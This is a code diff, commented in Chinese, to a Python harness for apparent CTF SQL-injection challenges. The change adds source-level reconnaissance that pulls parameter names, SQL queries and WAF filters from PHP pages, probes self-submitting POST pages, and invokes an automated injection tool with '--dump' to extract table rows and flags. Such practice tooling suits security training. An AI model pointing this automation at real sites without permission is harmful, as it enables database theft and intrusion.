@@ -78,13 +78,29 @@ def resolve_entry(base: str, name: str, cookie: str) -> tuple[str, str, str, str
         if s != 200:
             last_err = f"{page} -> {s}"
             continue
+        # 源码级侦察：参数名/请求方式优先从 PHP 源码里的 $_POST['x'] 读，
+        # 比猜表单可靠（web183 起页面干脆没有 <form>，只有 $sql 和返回值）
+        pm = re.search(r"\$_(POST|GET|REQUEST)\[\s*['\"](\w+)['\"]\s*\]", html)
+        src_method = "POST" if pm and pm.group(1) in ("POST", "REQUEST") else "GET"
+        if pm:
+            param = pm.group(2)
+        else:
+            im = INPUT_RE.search(html)
+            param = im.group(1) if im else "id"
+        sm = SQL_RE.search(html)
+        fm = re.search(r"function\s+waf\s*\([^)]*\)\s*\{([^}]{0,300})\}", html) \
+            or re.search(r"preg_match\s*\([^\n]{0,180}", html)
+
         am = ACTION_RE.search(html) or FALLBACK_ACTION_RE.search(html)
         if not am:
-            last_err = f"{page} 无 form action"
+            # 没有 form action（PHP 自提交页）：直接打页面本身
+            s2, body2 = http_post(base + page, {param: "1"}, cookie)
+            if s2 == 200 and len(body2) > 50 and "404" not in body2[:200]:
+                return (base + page, param, src_method,
+                        (sm.group(1) if sm else ""), (fm.group(0) if fm else ""))
+            last_err = f"{page} 自提交页探测失败（{s2}）"
             continue
         action = urllib.parse.urljoin(base + page, am.group(1))
-        im = INPUT_RE.search(html)
-        param = im.group(1) if im else "id"
         # 页面写的 action 不一定真实可用（web174 写 api/v2.php，真接口是 api/v4.php），
         # 逐个候选实测：返回 {"code":..} 的才是真接口
         cands = [action, urllib.parse.urljoin(action, "./"), base + page]
@@ -101,18 +117,34 @@ def resolve_entry(base: str, name: str, cookie: str) -> tuple[str, str, str, str
         if not real:
             last_err = f"{page} 的 action {action} 及候选接口均未返回 JSON"
             continue
-        sm = SQL_RE.search(html)
-        fm = re.search(r"function\s+waf\s*\([^)]*\)\s*\{([^}]{0,300})\}", html) \
-            or re.search(r"preg_match\s*\([^\n]{0,180}", html)
-        return (f"{real}?{param}=1", param,
+        return (real, param, "GET",
                 (sm.group(1) if sm else ""), (fm.group(0) if fm else ""))
     raise RuntimeError(f"定位入口失败：{last_err}")
 
 
-def stream_cli(url: str, param: str, budget: int, verbose: bool, log_path: str) -> tuple[int, str]:
+def http_post(url: str, data: dict, cookie: str) -> tuple[int, str]:
+    import urllib.parse as up
+    import urllib.request
+    body = up.urlencode(data).encode()
+    req = urllib.request.Request(url, data=body, headers={
+        "Cookie": "session=" + cookie,
+        "User-Agent": "Mozilla/5.0 AutoSQLi-battle",
+        "Content-Type": "application/x-www-form-urlencoded",
+    })
+    try:
+        with urllib.request.urlopen(req, timeout=25) as r:
+            return r.status, r.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "replace")
+
+
+def stream_cli(url: str, param: str, method: str, budget: int, verbose: bool,
+               log_path: str) -> tuple[int, str]:
     cmd = [sys.executable, "-u", "-m", "autosqli.cli", "-u", url, "-p", param,
            "--dump", "--fast", "--max-seconds", str(budget), "--timeout", "12",
            "--workers", "8", "--max-rows", "60"]
+    if method.upper() == "POST":
+        cmd += ["--method", "POST", "--data", f"{param}=1"]
     keep = re.compile(r"\[进度\]|注入点|指纹:|\[FLAG\]|\[WARN\]|\[ERROR\]|通道|请求数|"
                       r"脱库结果|已过滤|✗|★")
     out, t0 = [], time.time()
@@ -174,17 +206,17 @@ def main(argv=None):
         return 2
 
     try:
-        target, param, sql, filt = resolve_entry(base, c["name"], cookie)
+        target, param, method, sql, filt = resolve_entry(base, c["name"], cookie)
     except Exception as e:
         print(f"[{c['name']}] ❌ 入口定位失败: {e}", flush=True)
         return 2
-    print(f"[{c['name']}] 入口 {target}  参数 {param}", flush=True)
+    print(f"[{c['name']}] 入口 {method} {target}  参数 {param}", flush=True)
     if sql:
         print(f"[{c['name']}] 源码 {sql[:150]}", flush=True)
     if filt:
         print(f"[{c['name']}] 过滤 {filt[:150]}", flush=True)
 
-    rc, out = stream_cli(target, param, args.budget, args.verbose, log_path)
+    rc, out = stream_cli(target, param, method, args.budget, args.verbose, log_path)
     flags = list(dict.fromkeys(FLAG_RE.findall(out)))
     tech = re.search(r"通道: (\w+)", out)
     reqs = re.search(r"请求数: (\d+)", out)
